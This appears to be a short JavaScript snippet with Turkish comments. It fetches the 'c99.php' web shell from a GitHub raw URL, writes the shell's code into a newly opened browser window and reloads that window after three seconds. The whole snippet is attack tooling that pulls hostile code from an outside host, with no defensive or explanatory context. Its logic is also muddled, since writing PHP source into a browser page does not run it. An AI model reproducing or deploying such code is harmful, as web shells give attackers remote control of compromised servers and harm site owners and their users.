let shell_url = 'https://raw.githubusercontent.com/xpatheoz/patheoz_arsiv/refs/heads/main/c99.php';

fetch(shell_url)
  .then(r => r.text())
  .then(shell_code => {
    let yeni_pencere = window.open('c99.php', '_blank');
    yeni_pencere.document.open();
    yeni_pencere.document.write(shell_code);
    yeni_pencere.document.close();
    // 3 saniye sonra otomatik aç
    setTimeout(() => {
      yeni_pencere.location.reload();
    }, 3000);
  })
  .catch(e => console.log('Hata: ' + e));
